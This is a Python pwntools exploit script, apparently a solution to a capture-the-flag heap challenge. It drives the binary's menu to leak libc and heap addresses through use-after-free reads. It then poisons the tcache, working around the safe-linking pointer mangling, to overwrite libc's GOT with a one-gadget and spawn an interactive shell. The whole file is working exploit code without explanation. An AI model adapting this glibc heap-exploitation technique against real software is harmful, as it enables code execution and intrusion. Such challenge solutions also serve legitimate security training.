from pwn import *

io = process("./chal")
# io = remote("chal.amt.rs", 1346)
libc = ELF("./lib/libc.so.6")
p64 = util.packing.p64

def create_bullshit(index, size=100, data=None):
    io.sendlineafter(b">>>", b"1")
    io.sendlineafter(b">>>", str(index).encode())
    io.sendlineafter(b">>>", b"200")
    io.sendlineafter(b">>>", b"a"*199)
    if data:
        io.sendlineafter(b">>>", str(size).encode())
        io.sendlineafter(b">>>", data)
    else:
        io.sendlineafter(b">>>", str(size).encode())
        io.sendlineafter(b">>>", b"b"*(size-1))
    
def free_bullshit(index):
    io.sendlineafter(b">>>", b"4")
    io.sendlineafter(b">>>", str(index).encode())

def read_bullshit(index):
    io.sendlineafter(b">>>", b"3")
    io.sendlineafter(b">>>", str(index).encode())

def reverse_endian(data: str):
    data = [data[i:i+2] for i in range(0, len(data), 2)]
    data.reverse()
    return "".join(data)

def update_bullshit(index, data):
    io.sendlineafter(b">>>", b"2")
    io.sendlineafter(b">>>", str(index).encode())
    io.sendlineafter(b">>>", data)


gdb.binary = lambda: "/usr/bin/gdb-pwndbg"
if args.GDB:
    gdb.attach(io)
    pause()


create_bullshit(0, 3000)
create_bullshit(1, 200)
create_bullshit(2, 3000)
create_bullshit(3, 3000)
free_bullshit(0)
free_bullshit(2)
free_bullshit(3)
read_bullshit(0)



io.recvuntil(b"val = ")
leak = io.recvline().decode()
leak = eval(f'"""{leak}"""')[:6]

main_arena = util.packing.unpack(leak, 8*6)-96
libc.address = main_arena - 0x21ac80
libcgot = libc.address + 0x21a000
print("main_arena = " + hex(main_arena))
print("libc base = " + hex(libc.address))
print("libc got = " + hex(libcgot))

read_bullshit(2)

io.recvuntil(b"val = ")
leak = io.recvline().decode()
leak = eval(f'"""{leak}"""')[:6]
leak_heap = util.packing.unpack(leak, 8*6)

print("leak heap: " + hex(leak_heap))

create_bullshit(0, 200)
free_bullshit(0)

pos = leak_heap + 0x1a50
value = libcgot +0x28-8

to_write = value ^ (pos >> 12)
print("to write: " + hex(to_write))
onegadget = libc.address + 0xebc85

print("onegadget: " + hex(onegadget))

update_bullshit(0, p64(to_write))

pause()
create_bullshit(0, 200, b"A"*8 +p64(libc.address + 0x17082D) + b"B"*0x40 + p64(onegadget) + p64(libc.address + 0x82358) + b'X'*0x18 + p64(libc.address + 0x12B320))

io.interactive()
